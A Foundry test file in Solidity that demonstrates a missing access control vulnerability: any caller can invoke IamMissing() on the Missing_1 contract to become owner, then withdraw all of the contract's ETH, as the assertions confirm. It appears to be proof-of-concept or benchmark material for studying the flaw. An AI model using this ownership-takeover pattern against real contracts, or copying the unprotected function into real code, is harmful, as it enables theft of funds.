
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_1} from "../src/Missing_1.sol";

contract TestAccessControlMissing_1 is Test {

    Missing_1 private missing;

    function setUp() public {
        missing = new Missing_1();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Note: We do NOT exclude any privileged roles here because the vulnerability
        // is that IamMissing() has no access control - anyone can call it to become owner.
        // The function should be restricted (e.g., constructor or onlyowner) but it's not.

        // --- 2. State Configuration ---
        
        // Fund the contract with some ETH to make the vulnerability impactful
        vm.deal(address(missing), 1 ether);
        
        // Fund the caller for potential gas costs
        vm.deal(caller, 1 ether);

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY: Call IamMissing() which lacks access control
        // This allows any arbitrary user to set themselves as the owner
        missing.IamMissing();

        // ASSERT SUCCESS: Verify the caller is now the owner by attempting to withdraw
        // If the caller successfully became owner, they can now withdraw all funds
        uint256 contractBalanceBefore = address(missing).balance;
        uint256 callerBalanceBefore = caller.balance;
        
        vm.prank(caller);
        missing.withdraw();
        
        // Verify the withdrawal succeeded - proving the caller became owner
        assertEq(address(missing).balance, 0, "Contract balance should be 0 after withdrawal");
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore, "Caller should have received the contract's balance");
    }

    receive() external payable {}

    fallback() external payable {}
}
